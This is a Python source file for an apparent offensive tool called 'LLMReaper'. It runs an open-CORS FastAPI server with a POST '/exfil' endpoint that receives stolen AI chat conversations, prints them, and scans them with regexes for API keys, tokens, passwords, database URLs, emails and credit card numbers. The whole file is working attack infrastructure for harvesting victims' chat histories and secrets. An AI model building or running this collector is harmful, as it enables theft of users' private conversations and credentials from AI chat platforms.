import re
import sys
from os import path

import uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware

R = "\033[31m"  # red
G = "\033[32m"  # green
C = "\033[36m"  # cyan
W = "\033[0m"  # white
Y = "\033[33m"  # yellow
HEADER = "\033[1;35m"  # bold magenta

host = "0.0.0.0"
port = 8080

script_dir = path.dirname(path.realpath(__file__))

SECRET_PATTERNS = {
    "OpenAI API Key": r"sk-[a-zA-Z0-9_\-]{20,}",
    "Anthropic API Key": r"sk-ant-[a-zA-Z0-9\-]{20,}",
    "GitHub Token": r"gh[pousr]_[A-Za-z0-9_]{30,}",
    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
    "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
    "Stripe Secret Key": r"sk_live_[a-zA-Z0-9]{24,}",
    "Slack Token": r"xox[baprs]-[a-zA-Z0-9\-]{10,}",
    "HuggingFace Token": r"hf_[a-zA-Z0-9]{30,}",
    "JWT": r"eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+",
    "Password in text": r"(?i)(?:password|passwd|pwd)\s*[:=]\s*[^\s]+",
    "Email Address": r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",
    "IP Address": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
    "NPM Token": r"npm_[a-zA-Z0-9]{36}",
    "Twilio API Key": r"SK[a-zA-Z0-9]{32}",
    "SendGrid API Key": r"SG\.[a-zA-Z0-9\-_]{22}\.[a-zA-Z0-9\-_]{43}",
    "Telegram Bot Token": r"[0-9]{8,10}:[a-zA-Z0-9_\-]{35}",
    "Database URL": r"(?i)(?:postgres|mysql|mongodb|redis):\/\/[^\s]+",
    "Private IP Range": r"\b(192\.168|10\.\d+|172\.(1[6-9]|2\d|3[01]))\.\d+\.\d+\b",
    "Credit Card": r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b",
}


def banner():
    art = r"""
    __    __    __  _______                            
   / /   / /   /  |/  / __ \___  ____ _____  ___  _____
  / /   / /   / /|_/ / /_/ / _ \/ __ `/ __ \/ _ \/ ___/
 / /___/ /___/ /  / / _, _/  __/ /_/ / /_/ /  __/ /    
/_____/_____/_/  /_/_/ |_|\___/\__,_/ .___/\___/_/     
                                   /_/"""
    print(f"{C}{art}{W}\n")
    print(f"{G}[>]{W} Created By  : thewhiteh4t")
    print(f"{G} |-->{W} Twitter   : @thewhiteh4t")
    print(f"{G} |-->{W} Community : twc1rcle.com")


def scan_secrets(convo):
    findings = []

    convo = convo.replace("\\n", "\n")

    db_urls = re.findall(r"(?i)(?:postgres|mysql|mongodb|redis):\/\/[^\s]+", convo)

    for label, pattern in SECRET_PATTERNS.items():
        matches = set(re.findall(pattern, convo))

        if label == "Email Address":
            filtered = []

            for email in matches:
                inside_db_url = False

                for db in db_urls:
                    if email in db:
                        inside_db_url = True
                        break

                if not inside_db_url:
                    filtered.append(email)

            matches = filtered

        if matches:
            findings.append({"type": label, "matches": matches})

    return findings


def print_capture(data):
    payload = data.get("data", data)
    meta = payload.get("meta", {})
    convo = payload.get("conversation", [])
    platform = payload.get("platform", "Unknown")
    user = meta.get("user", "Unknown")
    title = meta.get("title", "")
    ts = meta.get("timestamp", "")

    full_text = " ".join(msg.get("text", "") for msg in convo)

    print(f"{G}[{ts}]{W} {C}{user}{W}@{Y}{platform}{W} - {title}")
    print(f"{HEADER}{'━' * 60}{W}")

    for msg in convo:
        role = msg.get("role", "?")
        text = msg.get("text", "").replace("\n", " ")
        color = C if role == "user" else Y
        print(f"{color}{role:<10}{W} : {text}")

    findings = scan_secrets(full_text)
    if findings:
        print(f"\n{HEADER}━━ Findings {'━' * 60}{W}\n")
        for f in findings:
            for match in f["matches"]:
                print(f"{R}[{f['type']}]{W} {match}")

    print(f"\n{HEADER}{'━' * 60}{W}")
    print(f"{C}[*]{W} Watching...\n")


app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.post("/exfil")
async def exfil(request: Request):
    data = await request.json()
    print_capture(data)
    return {"status": "ok"}


if __name__ == "__main__":
    banner()
    print(f"{C}\n[*]{W} Listening on {host}:{port}\n")
    try:
        uvicorn.run(app, host=host, port=port, log_level="critical")
    except OSError as e:
        print(f"\n{R}[-]{W} Port {port} already in use or permission denied: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{Y}[!]{W} Shutting down...")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[-]{W} Unexpected error: {e}")
        sys.exit(1)
